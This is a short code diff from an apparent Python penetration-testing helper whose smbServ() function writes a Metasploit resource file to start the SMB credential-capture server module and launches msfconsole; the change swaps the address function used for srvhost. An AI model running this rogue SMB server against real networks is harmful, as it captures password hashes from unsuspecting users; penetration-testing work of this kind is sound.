@@ -27,7 +27,7 @@ def smbServ():
 	if choice in yes:
 		with open(rcfile, 'w') as f1:
 			f1.write("use auxiliary/server/capture/smb"+"\n"+\
-				"set srvhost "+get_ip_address()+"\n"+\
+				"set srvhost "+get_internal_address()+"\n"+\
 				"exploit -j -z")
 		os.system('msfconsole -q -r smbServ.rc')
 	elif choice in no:
